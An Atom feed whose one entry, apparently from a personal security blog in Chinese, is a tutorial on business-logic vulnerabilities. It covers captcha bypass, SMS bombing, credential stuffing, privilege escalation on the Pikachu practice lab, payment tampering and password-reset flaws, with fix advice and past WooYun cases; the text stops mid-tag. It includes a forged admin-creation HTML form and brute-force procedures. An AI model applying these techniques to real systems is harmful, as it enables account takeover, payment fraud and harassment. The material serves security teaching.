<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>离沫凌天๓</title>
  
  <subtitle>花开花落 一路上起起跌跌</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://winthorlimo.github.io/"/>
  <updated>2020-08-20T09:26:58.287Z</updated>
  <id>https://winthorlimo.github.io/</id>
  
  <author>
    <name>离沫凌天๓</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>逻辑漏洞概述</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined14/44483515.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined14/44483515.html</id>
    <published>2020-08-14T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:58.287Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逻辑漏洞概述"><a href="#逻辑漏洞概述" class="headerlink" title="逻辑漏洞概述"></a>逻辑漏洞概述</h1><p>逻辑漏洞更多指一些<strong>业务类特有的</strong>逻辑漏洞，这些漏洞的特点是很难判断是否为漏洞。比如在一个商场系统中，用户 A 可以看到用户 B 的订单信息，对于计算机来说，程序运行是没有问题的，因为开发者就是这么设计的，但是对用用户来说，B 用户就会觉得自己的隐私泄露了。所以逻辑漏洞通常<strong>需要人为来判断是否为漏洞</strong>，而且大多数是程序猿设计开发之处没有考虑周到产生的。</p><p>常见的业务逻辑型漏洞，包括<strong>验证码安全</strong>、<strong>用户密码找回</strong>、<strong>接口盗用</strong>、<strong>账户越权</strong>、<strong>支付漏洞</strong>等问题，相比于如 SQL 注入漏洞、XSS 漏洞、上传、命令执行等传统应用安全方面的漏洞，现在的攻击者<strong>更倾向于去挖掘业务逻辑层面</strong>的安全问题，这类问题往往容易被开发者所忽视，同时也具有很大的危害性。</p><p>举个例子：2019 年初<a href="https://finance.sina.com.cn/chanjing/gsnews/2019-01-21/doc-ihrfqziz9527705.shtml" target="_blank" rel="noopener">拼多多被爆 100 元无门槛优惠券漏洞</a>就使拼多多遭受一定量的损失。</p><h2 id="逻辑漏洞越来越受重视"><a href="#逻辑漏洞越来越受重视" class="headerlink" title="逻辑漏洞越来越受重视"></a>逻辑漏洞越来越受重视</h2><p>如今的业务系统对于传统安全漏洞防护的技术和设备越来越成熟， 基于传统安全漏洞入侵也变得越来越困难，增加了黑客的攻击成本。而业务逻辑漏 洞可以逃逸各种安全防护，迄今为止没有很好的解决办法，并且也可以利用设计缺陷进行交易数据篡改、敏感信息盗取、资产的窃取等操作。恰巧现在的黑客不再以炫耀技能为主要攻击目的，而主要 以经济利益为目的，攻击的目的逐渐转变为趋利化。</p><h2 id="如何更好地学习业务安全"><a href="#如何更好地学习业务安全" class="headerlink" title="如何更好地学习业务安全"></a>如何更好地学习业务安全</h2><p>了解目标平台的业务流程，并进行一次全面的梳理，可以先将业务主体划分为几个大模块，再将每个大模块逐 个细分为子模块。</p><p>掌握控制变量法，如在分析平行权限跨越时，需要明白每一次步骤变的是什么，不变的是什么，控制好不同变量 的变化，从而筛选出影响业务流程的参数。</p><p>学会使用思维导图等工具。在面对复杂的系统时，我们需要通过思维导图等工具来协助我们理清各个业务模块之间的联系，从而做到有的放矢。</p><h2 id="按照功能点分类"><a href="#按照功能点分类" class="headerlink" title="按照功能点分类"></a>按照功能点分类</h2><p><img src="http://qiniuyun.lintstar.top/image-20200806090836565.png" alt="image-20200806090836565"></p><h3 id="任意用户注册"><a href="#任意用户注册" class="headerlink" title="任意用户注册"></a>任意用户注册</h3><p>本该在服务端处理的验证码，被后端返回到了响应里，导致可以使用任意手机号进行注册：</p><p><img src="http://qiniuyun.lintstar.top/image-20200806091035324.png" alt="image-20200806091035324"></p><h3 id="用户名遍历"><a href="#用户名遍历" class="headerlink" title="用户名遍历"></a>用户名遍历</h3><p>找到用户名 ID 规律或者是注册手机号，即可使用 BP 来遍历信息：</p><p><img src="http://qiniuyun.lintstar.top/image-20200806091555079.png" alt="image-20200806091555079"></p><h3 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h3><p>发送短信验证码接口未做时间限制，导致攻击者可以对该接口请求包不断重放，并且修改目标手机号为目标手机号，从而导致无限制发送短信，形成短信轰炸。</p><ol><li>凡是看到可以发短信的地方，多重复发几次数据包</li><li>如果使用验证码登陆，获取到验证码发现都是纯数字，尝试爆破验证码</li></ol><h3 id="撞库测试"><a href="#撞库测试" class="headerlink" title="撞库测试"></a>撞库测试</h3><p><a href="https://mp.weixin.qq.com/s?src=11&amp;timestamp=1596676958&amp;ver=2505&amp;signature=mSgsXGl4i1i7r0offwBJoUV76av3oVtFuVrk81gnBbRPSr3ePUQle2aHzoj4Nzc44aHo9*evFFIpJ*FzTUy3gV3EovJXuR8O5KBcTsRPgFdWQDbdZ-B2GIDZDu1oKKkz&amp;new=1" target="_blank" rel="noopener">抖音千万级账号遭撞库攻击，牟利百万黑客被警方逮捕</a></p><p>撞库攻击实则非法牟利者一种碰运气的表现。这种方式是通过已经被泄露的部分信息，再进行其他平台的重复登录操作，一旦登陆成功则撞库成功。</p><p>通常被黑客选作撞库对象的账号密码所有者安全意识都不高，他们很有可能将同样的账号、密码作为几个平台的通用’’钥匙”，这为撞库的成功提供了保障。</p><p><strong>Demo 源码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$name = $_REQUEST[<span class="string">'name'</span>];</span><br><span class="line">$pass = $_REQUEST[<span class="string">'pass'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass) <span class="keyword">and</span> <span class="keyword">isset</span>($name) <span class="keyword">and</span> $pass === <span class="string">'123456'</span> <span class="keyword">and</span> $name === <span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'flag&#123;xxxxxxx&#125;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'login fail &lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hint: name and pass"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>场景模拟：用户名和密码一一对应</strong></p><p>假设获取泄露的用户名和密码的关系为：</p><table><thead><tr><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>root</td><td>1234</td></tr><tr><td>test</td><td>1231231</td></tr><tr><td>administrator</td><td>123123</td></tr><tr><td>anonymous</td><td>1323</td></tr><tr><td>admin</td><td>123456</td></tr></tbody></table><p>攻击类型选择：Pitchfork</p><p><img src="http://qiniuyun.lintstar.top/image-20200806094537766.png" alt="image-20200806094537766"></p><p>可以看到 Payload 规律为一一对应：</p><p><img src="http://qiniuyun.lintstar.top/image-20200806094646332.png" alt="image-20200806094646332"></p><h2 id="推荐书籍资料"><a href="#推荐书籍资料" class="headerlink" title="推荐书籍资料"></a>推荐书籍资料</h2><ul><li>《白帽子讲 Web 安全》</li><li>《PHP Web安全开发实战》</li><li>《Web攻防之业务安全实战指南》</li></ul><h1 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h1><p>验证码的作用是防止某个攻击者进行暴力破解，比如常见的验证码用来防止机器批量注册、机器批量发帖回复等，为了防止用户利用机器人自动注册、登录、灌水等，大部分网站都才用了验证码技术。随着很多重要业务往 Web 上迁移，现在很多关键的敏感操作也是需要验证码来进行认证的，验证码安全性也逐步不重视。</p><h2 id="验证码过于简单"><a href="#验证码过于简单" class="headerlink" title="验证码过于简单"></a>验证码过于简单</h2><p>验证码就是每次访问页面时随机生成的图片，内容一般是数字和字母，也有复杂的中文，需要访问者正确识别并提交，才会触发表单认证机制，这样就有效地防止了暴力破解。但是有时候往往过于简单，很容易被验证码识别引擎或者接口识别出来，形同虚设，导致攻击者依然可以正常使用机器进行批量操作。</p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-012722.html" target="_blank" rel="noopener">乌云官方验证码容易识别的bug</a></p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0204186.html" target="_blank" rel="noopener">驴妈妈旅游网某业务系统从验证码绕过再到任意酒店数据导出</a></p><p>以前前几天测试的验证码爆破练习，在实在挖不到漏洞的情况下，如果验证码规则不复杂，可以尝试写 Python 脚本去调用验证码识别接口，然后单线程爆破或者撞库测试。</p><p><strong>加固方法</strong></p><p>常常有字体扭曲、背景色干扰、字体粘连、背景字母干扰、字体镂空、公式验证码、字体混用、加减法验证码、主题干扰线、逻辑验证码</p><h2 id="数字暴力破解"><a href="#数字暴力破解" class="headerlink" title="数字暴力破解"></a>数字暴力破解</h2><p>平时注册账号、修改验证码、安全认证登等方面都需要用到验证码，很多系统为了让用户体验更好，只设置了 4 位数字的验证码。这种 4 为数字的验证码让用户方便的同时，也带了安全风险，比如攻击者发现 4 为数字的验证码，第一反应可能就会思考这个验证码是否可以暴力破解。</p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-011720.html" target="_blank" rel="noopener">微信任意用户密码修改漏洞</a></p><p>将包文中的verifycode进行重复提交后发现会提示提交过于频繁</p><p>经过一系列尝试后发现如果在<code>phone=18666666666</code>的号码后面添加不为数字的字符时,可以绕过此限制。这个地方的薄弱环节在于微信重置密码的验证码为4-5位纯数字。且数字范围在 1000-20000 之间。也就是说.只要尝试 19000 次，用 50 个线程发包，3分钟即可成功修改一个密码。</p><p><strong>加固方法</strong></p><p>开发者涉及短信验证码的时候尽量用 6 位数字验证，并且设置验证码失效时间，也可以尝试增加验证码输错次数限制，增加黑客攻击难度。</p><h2 id="空验证码突破"><a href="#空验证码突破" class="headerlink" title="空验证码突破"></a>空验证码突破</h2><p>大多数验证码的生命周期是这样的：用户访问验证码页面或者接口-&gt; 生成 Code 并保存到 Session 中 -&gt; 用户提交验证代码 -&gt; 用户提交的值和服务器的值做对比，但是在某些情况下，黑客可以不访问验证码接口，直接提交空验证码也是可以绕过的。</p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-046547.html" target="_blank" rel="noopener">乌云集市验证码机制绕过</a></p><p>乌云的验证码机制是页面加载完成后，去请求captcha.php生成验证码，将验证码记录。当再次请求或跟换验证码时，在访问一次 captcha.php 生成验证码，那么我们直访问一次 captcha.php 生成验证码后，不去访问captcha.php 后，验证码永远为第一次产生的。说到底就是验证码和页面不是同步机制，而是异步交互，导致绕过：</p><p><img src="http://qiniuyun.lintstar.top/1278cdab3d37914c6b6a5576b375f3860db4c7a1.jpg" alt="1278cdab3d37914c6b6a5576b375f3860db4c7a1"></p><p>再次来梳理一下：存在漏洞的系统的验证码机制是用户请求页面后，服务器会生成验证码，并将验证码记录下来。当用户提交表单时，会验证此验证码是否与服务器中的一致。试想一下，如果白帽子不访问页面，而且直接提交表单，这个时候服务器是没有对应值的，白帽子提交了验证码，理论上来说不能通过的，但是白帽子如果提交的验证码为空的时候，正好域服务器的空值所对应，因为 PHP 是弱类型语言，这样就导致了验证码被绕过。</p><p>下面是抽象出来的代码片段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'captcha'</span>] != $_SESSION[<span class="string">'captcha'</span>])&#123;</span><br><span class="line">    <span class="comment">// 验证码不通过，清空验证码，返回 False</span></span><br><span class="line">    <span class="keyword">unset</span>($_SESSION[<span class="string">'captcha'</span>]);</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">"status"</span>=&gt;<span class="keyword">false</span>,<span class="string">"msg"</span>:<span class="string">"验证码失败"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> [<span class="string">"status"</span>=&gt;<span class="keyword">true</span>,<span class="string">"msg"</span>:<span class="string">"验证码成功"</span>];</span><br></pre></td></tr></table></figure><p>为了防止验证码被多次使用，将 SESSION 中的 信息给清空了。此时如果攻击者没有访问验证码生成页面，SESSION 中的 captcha 这个 key 是不存在的，因为 PHP 语言的特性，空值和变量不存在作对比，结果是相等的。</p><p><strong>加固方法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'captcha'</span>]))&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">"status"</span>=&gt;<span class="keyword">false</span>,<span class="string">"msg"</span>:<span class="string">"验证码不能为空"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复这种漏洞比较简单，只需要在做对比前限制空验证码就可以防止此漏洞的产生。</p><h2 id="首次绕过"><a href="#首次绕过" class="headerlink" title="首次绕过"></a>首次绕过</h2><p>很多网站为例方便用户，设置了第一次登陆无需验证码，当用户第一次输入不正确的时候，才会需要输入验证码。但判断用户是否第一次登陆的依据是什么呢？很多开发者并没有搞清楚，因此造成了验证码绕过问题。</p><p>有一部分开发者通过 Session 信息来判断是否启用验证码，但攻击者可以每次访问前都清掉 sessionid ，这样就造成绕过验证码漏洞。</p><p><a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0215312" target="_blank" rel="noopener">爱卡汽车网某重要系统设计逻辑缺陷(成功绕过验证码限制)影响内部敏感信息</a></p><p>找到后台开始爆破，发现只有第一次登陆不需要输入验证码，后面都是需要输入验证码的。</p><p><img src="http://qiniuyun.lintstar.top/image-20200806104201245.png" alt="image-20200806104201245"></p><p>这时候白帽子想到，既然第一次不需要输入验证码，是不是能让服务器觉得每次提交都是第一次呢？围绕这个目标，经过多次推理和测试，终于发现判断是否显示验证码的规则是通过服务器的 Session 信息来判断的：</p><p><img src="http://qiniuyun.lintstar.top/image-20200806104221957.png" alt="image-20200806104221957"></p><p>Session 是基于 Cookie 来保持会话的，每次提交数据的时候都更改 sessionid，这样服务器在判断 Session 信息时，就不知道前台提交的是多次提交过的数据，也就不需要验证码来验证了。</p><p><strong>加固方法</strong></p><p>在开发类似功能的时候，一定要想到判断是否被用户通过更改 Cookie 的方式来绕过，不过 Web 系统很难界定用户是否是首次访问，所以在设计此类需求的时候，不要使用单一维度来界定，而是使用多维度来判断，比如用户的 IP 地址、登录的用户名、操作的频率次数等多方面因素。</p><h2 id="凭证返回"><a href="#凭证返回" class="headerlink" title="凭证返回"></a>凭证返回</h2><p>开发者不严谨，导致抓包可以看到验证码在回显中显示，由于验证码直接返回，因此可以通过该漏洞注册任意用户、重置已注册用户密码、修改绑定信息等高危操作，对用户造成一定影响。</p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0179467.html" target="_blank" rel="noopener">某情趣用品电商App验证码获取接口返回验证码信息可重置任意账号密码</a></p><p><img src="http://qiniuyun.lintstar.top/ecaed33768bb8f105d8effbd2fe1884424b2707b.jpg" alt="ecaed33768bb8f105d8effbd2fe1884424b2707b"></p><p><strong>加固方法</strong></p><p>不要将短信验证码放在客户端中，不要过于信任客户端，验证码只存在于服务端中，不能通过任何 API 直接获取。</p><h1 id="账户越权"><a href="#账户越权" class="headerlink" title="账户越权"></a>账户越权</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>从字面意思理解就是用户可以操作超出自己管理权限范围的功能，主要原因是开发者在对数据库进行 CRUD （Create, Read, Update and Delete）时，对客户端请求的数据遗漏了对权限的判定。</p><p>大多数 Web 应用系统都具备权限划分和控制，但是如果权限校验存在问题，攻击者就可以通过这些问题来访问未经授权的功能或数据，这就是通常说的越权漏洞。</p><p>我们一般将越权漏洞分为三种：<strong>未授权</strong>、<strong>水平越权</strong>、<strong>垂直越权</strong>。</p><h2 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a>未授权</h2><p>开发者未考虑到用户是否经过登录或者认证的情况下直接返回敏感数据，我们称之为未授权访问漏洞。假设有一个 URL 是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x/getUserInfo.php?uid=100</span><br></pre></td></tr></table></figure><p>在这个 URL 中可以看出后端通过 uid 参数值返回相应的用户信息。如果这个接口没有做用户登录验证或者管理员的身份验证，那么所有人都能访问到，很有可能导致用户信息可以被遍历输出。</p><p><strong>可预测的 URL</strong></p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0206754.html" target="_blank" rel="noopener">招商银行某接口未授权访问泄露姓名/账单信息</a></p><p>SMS Sniffer 抓到招行的两条短信通知，得到以下链接，发现没有登录就可以直接查看到对方用户的账单金额，并且通过排除法发现关键参数是 clientid 值，这两个值只有 4 个字符有区别，所以通过简单遍历就可以收集到这些数据。</p><p><a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2013-037209" target="_blank" rel="noopener">中国国际航空公司某后台越权操作</a></p><p>谷歌语法搜索到网站后台的时候，访问可以直接进入后台，并可以进行操作。建议后台系统不要与前台业务共用一个域名。</p><h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>水平越权指的是攻击者尝试访问与他拥有相同权限用户的资源。水平越权通常可查看其他用户信息，修改其他用户资料等操作。比如酒店会员系统，可查看其他用户的酒店订房订单信息；博客系统，可查看其他博主私人博文等信息。</p><p><a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0206705" target="_blank" rel="noopener">Mtime时光网越权查看订单</a></p><p>当这个地址被用户访问后，后端的逻辑会去查询数据库，查询的 SQL 语句可能是这样的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">order</span> <span class="keyword">where</span> googsOrderID = <span class="number">7708433</span></span><br></pre></td></tr></table></figure><p>攻击中可以轻易地进行订单 ID 遍历，就会把所有的订单信息爬取出来。</p><h3 id="Pikachu-漏洞靶场"><a href="#Pikachu-漏洞靶场" class="headerlink" title="Pikachu 漏洞靶场"></a>Pikachu 漏洞靶场</h3><p>首先修改 hosts 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.20.25.43 www.pikachu.com</span><br></pre></td></tr></table></figure><p>就可以成功访问 Pikachu 漏洞靶场了，尝试访问水平越权，首先所有用户信息如下：</p><table><thead><tr><th>用户</th><th>密码</th></tr></thead><tbody><tr><td>lucy</td><td>123456</td></tr><tr><td>lili</td><td>123456</td></tr><tr><td>kobe</td><td>123456</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.pikachu.com/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=点击查看个人信息</span><br></pre></td></tr></table></figure><p>很明显这里修改 <code>username</code> 即可查看其它用户的信息。问题代码：</p><p><img src="http://qiniuyun.lintstar.top/image-20200805204710871.png" alt="image-20200805204710871"></p><p><strong>加固方法</strong></p><p>对于一些敏感的数据，在防御上需要先验证用户身份后再做查询处理。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">order</span> <span class="keyword">where</span> uid=<span class="number">100</span> <span class="keyword">and</span> orderid=<span class="number">10000</span></span><br></pre></td></tr></table></figure><p>这里代码的 uid 不能由前端传递过来，而应该由后端从 Session 中获取。</p><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>垂直越权指的是一个低权限攻击者尝试访问高权限用户的资源。如果普通用户能利用某种攻击手段访问到管理功能，那我们就称之为垂直越权。</p><p><a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0169998" target="_blank" rel="noopener">中国联通某游戏业务平台漏洞打包</a></p><p>使用低权限的用户登录，访问只有管理员能够访问的URL，可查看所有用户信息：</p><p><a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-0100876" target="_blank" rel="noopener">中国电信天翼宽带政企网关A8-B垂直越权，可获取最高权限#2</a></p><p>使用默认用户名和密码（普通权限,仅读），修改参数id，即可获得telecomadmin权限（超级管理员权限，可读写）。</p><p><a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-084657" target="_blank" rel="noopener">天清汉马USG防火墙越权操作</a></p><p>使用audit审计用户登录系统，在点击菜单是，将识别参数修改为system.admin，这时，audit用户就拥有修改管理员信息以及权限的能力。</p><h3 id="Pikachu-漏洞靶场-1"><a href="#Pikachu-漏洞靶场-1" class="headerlink" title="Pikachu 漏洞靶场"></a>Pikachu 漏洞靶场</h3><table><thead><tr><th>用户</th><th>密码</th><th>权限</th></tr></thead><tbody><tr><td>admin</td><td>123456</td><td>查看、添加用户</td></tr><tr><td>pikachu</td><td>000000</td><td>查看用户</td></tr></tbody></table><p>抓取 admin 添加用户的数据包：</p><p><img src="http://qiniuyun.lintstar.top/image-20200805205550010.png" alt="image-20200805205550010"></p><p>和 CSRF 思路一样，尝试生成 HTML 表单，然后使用 pikachu 来触发表单：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://www.pikachu.com/vul/overpermission/op2/op2_admin_edit.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"test"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"123456"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"boy"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phonenum"</span> <span class="attr">value</span>=<span class="string">"111111"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"tony@qq.com"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"address"</span> <span class="attr">value</span>=<span class="string">"安恒大厦"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者记录 pikachu cookie 信息，来手动替换。不过本关卡更简单，pickachu 用户直接访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.pikachu.com/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure><p>就可以直接进入到创建用户的界面</p><h2 id="实用总结"><a href="#实用总结" class="headerlink" title="实用总结"></a>实用总结</h2><ol><li>请求中不存在参数，只用 cookie 进行身份验证，通常不可越权。</li><li>请求中存在参数，并且参数中的某些值可能是辨别信息的唯一值（如userID、IDNO、departmentID、key、ID等），可能存在越权（越权的原因通常是参数中的 userID(例如)没有判断是否与cookie中用户属同一用户）</li></ol><h1 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h1><p>随着移动支付的普及，越来越多的人习惯网上购物，大量的电商网站也都可以用在线支付完成交易。而在线直充必然涉及在线支付的流程，这里面存在很多逻辑问题。由于涉及到金钱，如果涉及不当，很有可能会产生诸如 0 元购买商品之类的严重漏洞。</p><h2 id="金额数据篡改"><a href="#金额数据篡改" class="headerlink" title="金额数据篡改"></a>金额数据篡改</h2><p>一些购物网站在支付时使用前端传过来的金额，并且没有对金额进行验证，导致金额数据篡改的产生，而正常的操作应该是在后端计算订单金额。</p><p>在购买或充值的位置坐测试，比如对提交订单的请求进行抓包，如果里面有金额字段，就修改金额等字段，例如在支付页面抓取请求中商品的金额字段，修改成任意数额的金额并提交，查看能否以修改后的金额数据完成业务流程。</p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0117083.html" target="_blank" rel="noopener">12308订单支付时的总价未验证漏洞(支付逻辑漏洞)</a></p><h2 id="商品数量修改"><a href="#商品数量修改" class="headerlink" title="商品数量修改"></a>商品数量修改</h2><p>购买商品的时候通常有一个数量选项，用户可以对商品的数量做加减，通常会在前段会限制商品不能为 0，但是开发者在后端却没有做出相应限制，这就导致攻击者可以通过修改数据包造成商品数量小于 1</p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0107316.html" target="_blank" rel="noopener">凤凰商城1元购物漏洞（支付漏洞购买任意商品）</a></p><p>很明显一个是商品ID 一个是数量，修改数量把一元的修改成 -19，最后效果如下：</p><p><a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-0109037" target="_blank" rel="noopener">蔚蓝团支付逻辑漏洞(可负数支付)</a></p><p>抓包，并修改数量为 -1：</p><p><img src="http://qiniuyun.lintstar.top/image-20200806144446005.png" alt="image-20200806144446005"></p><h2 id="运费金额修改"><a href="#运费金额修改" class="headerlink" title="运费金额修改"></a>运费金额修改</h2><p>购买商品经常还包含着运费信息，产生的运费与所不同，运费如果是前端提交的金额，不经过后端处理验证，那么久很可能产生此漏洞。</p><p><a href="http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2013-019761" target="_blank" rel="noopener">新东方逻辑支付漏洞</a></p><p>随便找一个课程，立即报名，抓包，发现金额无法修改，他是直接和schoolid绑定的，不过还有一处我们可以利用，那就是配送方式，且配送方式的金额可以，不过有验证，课程+配送运费不能低于0，所以我们就让他成为正吧。修改运费为-，两者相加则为正数才可以，最后设置为1元成功下单。</p><h1 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h1><h2 id="密码重置基本概念"><a href="#密码重置基本概念" class="headerlink" title="密码重置基本概念"></a>密码重置基本概念</h2><p>密码找回功能本意是设计给那些忘记密码的用户，以便他们能够找回自己的密码。但是由于程序猿开发逻辑问题，可能会导致可以重置任意用户密码的漏洞产生。</p><h2 id="验证码不失效"><a href="#验证码不失效" class="headerlink" title="验证码不失效"></a>验证码不失效</h2><p><strong>造成原因</strong>:<br>找回密码的时候获取的验证码缺少时间限制仅判断了验证码是否正确未判断验证码是否过期</p><p><strong>测试方法</strong>:<br>通过枚举找到真正的验证码输入验证码完成验证</p><p>输入目标手机号，获取验证码随意输入验证码 0004 点击提交，拦截数据包：</p><p>不是失效的话就直接 BP 爆破验证码即可</p><p><strong>总结</strong>:<br>这种验证码不失效的情况现在已经是非常少见的了，而且验证码的位数也很少有简单的 4 位验证码了。现在绝大多数是这样的：6 位数的验证码而且 15 分钟内有效，这样子的话爆破的可能性就非常的低了。</p><h2 id="验证码直接返回"><a href="#验证码直接返回" class="headerlink" title="验证码直接返回"></a>验证码直接返回</h2><p><strong>造成原因</strong>:<br>输入手机号后点击获取验证码，验证码在客户端生成，并直接返回指 HTML 中以方便对接下来的验证码进行对比</p><p><strong>测试方法</strong>:<br>直接输入目标手机号，点击获取验证码，并观察返回包即可。在返回包中得到目标手机号获取的验证码，进而完成验证，重置密码成功</p><p><strong>总结</strong>:<br>以前也见过这样一个类似的案例，具体情况是在找回密码返回包中，直接返回了旧密码的<code>md5</code> 值，然后修改返回包可以直接重置管理员的密码。</p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-058210.html" target="_blank" 